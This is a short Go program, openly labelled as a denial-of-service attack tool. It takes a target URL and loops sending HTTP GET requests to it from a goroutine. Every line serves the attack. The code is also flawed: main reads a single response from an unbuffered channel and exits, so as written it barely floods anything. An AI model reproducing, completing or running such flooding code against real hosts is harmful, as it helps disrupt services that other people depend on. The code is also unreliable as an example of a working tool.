package main

import (
	"flag"
	"fmt"
	"net/http"
	"os"
)

var target = flag.String("target", "", "target to run DoS Attack on")

func main() {
  // channel for accepting responses and passing them through to the pipeline
	resChannel := make(chan interface{})
  flag.Parse()
  // checking for value in required flags
	if *target == "" {
		flag.PrintDefaults()
		os.Exit(1)
	}
	fmt.Println(*target)
	go func() {
		for {
			resp, err := http.Get(*target)
			if err != nil {
				panic(err)
			}
			resChannel <- resp
		}
	}()
	fmt.Println(<-resChannel)
}
